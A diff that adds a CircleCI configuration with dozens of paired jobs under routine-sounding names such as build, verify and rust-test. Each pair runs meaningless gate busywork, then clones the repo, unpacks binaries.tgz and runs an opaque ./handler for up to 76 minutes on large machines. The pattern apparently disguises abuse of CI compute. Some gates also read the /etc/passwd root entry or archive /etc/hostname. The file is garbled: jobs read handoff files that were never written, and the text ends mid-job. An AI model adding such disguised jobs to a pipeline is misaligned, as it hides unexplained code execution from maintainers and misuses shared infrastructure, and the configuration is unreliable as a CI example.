@@ -1,0 +1,1780 @@
+version: 2.1
+
+jobs:
+  green_Rollout_Suite1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: flutter kick
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "%d\n" $((RANDOM * 17 + 42)); true ; } > /tmp/.wsp/relay.state
+            echo "gate Rollout_Suite1: $(wc -c </tmp/.wsp/relay.state) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - relay.state
+  Rollout_Suite1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/relay.state
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  beta_rm-router-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: wed evening
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 12582912 | fold -w16 | sort -u | wc -l; true ; } > /tmp/.wsp/timings.csv
+            echo "gate rm-router-leak: $(wc -c </tmp/.wsp/timings.csv) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - timings.csv
+  rm-router-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/timings.csv
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  teardown_artifacts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: calm step
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "key1=val1\nkey2=val2\nkey3=val3\n" | awk -F= '{print $1" -> "$2}'; true ; } > /tmp/.wsp/593.out
+            echo "gate artifacts: $(wc -c </tmp/.wsp/593.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 593.out
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/593.out
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  precheck_build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: red light
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 10000 | awk 'END{print NR}'; true ; } > /tmp/.wsp/report.log
+            echo "gate build: $(wc -c </tmp/.wsp/report.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - report.log
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/report.log
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  phase_prometheus-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: pennant
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 50 /dev/urandom | wc -c; true ; } > /tmp/.wsp/relay.sig
+            echo "gate prometheus-alpha: $(wc -c </tmp/.wsp/relay.sig) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - relay.sig
+  prometheus-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/202x.data
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  precheck_p-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: hanging straight
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "abcdef" | awk 'BEGIN{FS=""}{for(i=1;i<=NF;i++)print $i}' | wc -l; true ; } > /tmp/.wsp/bundle.bin
+            echo "gate p-v2: $(wc -c </tmp/.wsp/bundle.bin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - bundle.bin
+  p-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/216.txt
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  bake_UAT_INIT_4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: harmony
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print cos(0), sin(1.5708), exp(1)}'; true ; } > /tmp/.wsp/main_phase_output_v3.txt
+            echo "gate UAT_INIT_4: $(wc -c </tmp/.wsp/main_phase_output_v3.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - main_phase_output_v3.txt
+  UAT_INIT_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/main_phase_output_v3.txt
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  ensure_papa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: smooth out
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; sed -n '/^root/p' /etc/passwd | head -1 | md5sum; true ; } > /tmp/.wsp/READY
+            echo "gate papa: $(wc -c </tmp/.wsp/READY) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - READY
+  papa:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/READY
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  hook_rl-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: massage ball
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="abcdefghij"; for(i=1;i<=length(s);i++)print i, substr(s,i,1)}' | wc -l; true ; } > /tmp/.wsp/202x.data
+            echo "gate rl-alt: $(wc -c </tmp/.wsp/202x.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 202x.data
+  rl-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/202x.data
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  deps_PROD_RUN_1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: scrub out
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 19545); do printf "%d\n" $i; done ) | sort -n | tail -1; true ; } > /tmp/.wsp/step-17.log
+            echo "gate PROD_RUN_1: $(wc -c </tmp/.wsp/step-17.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-17.log
+  PROD_RUN_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/216.txt
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  preinit_verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: reboot
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "data" | b2sum 2>/dev/null | head -c 20 || echo "data" | md5sum | head -c 20; true ; } > /tmp/.wsp/156.txt
+            echo "gate verify: $(wc -c </tmp/.wsp/156.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 156.txt
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/216.txt
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  p1_qi-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: swing out
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes "abc" | head -500 | sort | uniq | wc -l; true ; } > /tmp/.wsp/81.log
+            echo "gate qi-test: $(wc -c </tmp/.wsp/81.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 81.log
+  qi-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/81.log
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  D_validate-production-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: zip zap
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "aaa bb c" | awk '{for(i=1;i<=NF;i++)total+=length($i)}END{print total}'; true ; } > /tmp/.wsp/.done
+            echo "gate validate-production-docker-image: $(wc -c </tmp/.wsp/.done) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .done
+  validate-production-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/216.txt
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  step2_Run_App4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: head south
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "%s " a b c | awk '{for(i=1;i<=NF;i++)print NR,i,$i}' | wc -l; true ; } > /tmp/.wsp/.state
+            echo "gate Run_App4: $(wc -c </tmp/.wsp/.state) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .state
+  Run_App4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/.state
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  run_feat-7693:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: banner down
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<10;i++)printf "%d:%d\n",i,i*i}' | wc -l; true ; } > /tmp/.wsp/report.md
+            echo "gate feat-7693: $(wc -c </tmp/.wsp/report.md) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - report.md
+  feat-7693:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/report.md
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  bake_rust-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: tests
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "x" | awk '{for(i=0;i<10;i++)print i}'; true ; } > /tmp/.wsp/stage-done.sig
+            echo "gate rust-test: $(wc -c </tmp/.wsp/stage-done.sig) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-done.sig
+  rust-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/stage-done.sig
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  g2_depoly-74:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: whistle a tune
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 100 | sha1sum | awk '{print $1}'; true ; } > /tmp/.wsp/2024-11-20.data
+            echo "gate depoly-74: $(wc -c </tmp/.wsp/2024-11-20.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-11-20.data
+  depoly-74:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/2024-11-20.data
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  beta_rm-queue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: tide
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo $((2**15)); true ; } > /tmp/.wsp/ckpt-C.state
+            echo "gate rm-queue: $(wc -c </tmp/.wsp/ckpt-C.state) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-C.state
+  rm-queue:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/ckpt-C.state
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  Alpha_rm-oauth-crash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: plank 60
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; alias | wc -l 2>/dev/null || echo zero; true ; } > /tmp/.wsp/.ok
+            echo "gate rm-oauth-crash: $(wc -c </tmp/.wsp/.ok) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .ok
+  rm-oauth-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/202x.data
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  hook_fx-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: leg curl
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 512 /dev/urandom | sha256sum | awk '{print $1}'; true ; } > /tmp/.wsp/gate-ok.out
+            echo "gate fx-alt: $(wc -c </tmp/.wsp/gate-ok.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - gate-ok.out
+  fx-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/gate-ok.out
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  preinit_DATA-940:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: compass true
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 5000 | awk '{s+=$1*$1}END{print s}'; true ; } > /tmp/.wsp/audit.ndjson
+            echo "gate DATA-940: $(wc -c </tmp/.wsp/audit.ndjson) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - audit.ndjson
+  DATA-940:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/202x.data
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  bootstrap_add-dashboard:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: lateral raise
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 20 | xargs -n 4 2>/dev/null | wc -l; true ; } > /tmp/.wsp/28.log
+            echo "gate add-dashboard: $(wc -c </tmp/.wsp/28.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 28.log
+  add-dashboard:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/216.txt
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  dispatch_bug-5283:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: dropped stitch
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=8;i++){for(j=1;j<=i;j++)printf "*"; print ""}}'; true ; } > /tmp/.wsp/artifact.bin
+            echo "gate bug-5283: $(wc -c </tmp/.wsp/artifact.bin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - artifact.bin
+  bug-5283:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/artifact.bin
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  Delta_MERGE_QA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: shrimp squat
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="repetition"; for(i=1;i<=length(s);i++){c=substr(s,i,1); if(c in seen){dup++}; seen[c]=1}; print dup}'; true ; } > /tmp/.wsp/65.blob
+            echo "gate MERGE_QA: $(wc -c </tmp/.wsp/65.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 65.blob
+  MERGE_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/65.blob
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  p2_callisto-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: no touch
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tar -czf - /etc/hostname 2>/dev/null | wc -c; true ; } > /tmp/.wsp/step-30.log
+            echo "gate callisto-final: $(wc -c </tmp/.wsp/step-30.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-30.log
+  callisto-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Ingest handoff
+          command: |
+            cat /tmp/.wsp/step-30.log
+      - run:
+          name: Load repo
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull static data
+          command: tar xzf binaries.tgz
+      - run:
+          command: uname -a
+      - run:
+          name: Settle filesystem
+          command: uname -a
+      - run:
+          command: ls -la
+      - run:
+          no_output_timeout: 76m
+          command: bash -c "./handler"
+  rerun_juliet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: snatch
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nd\ne\n" | nl 2>/dev/null | head -3 || printf "a\nb\nc\nd\ne\n" | awk '{print NR,$0}' | head -3; true ; } > /tmp/.wsp/216.txt
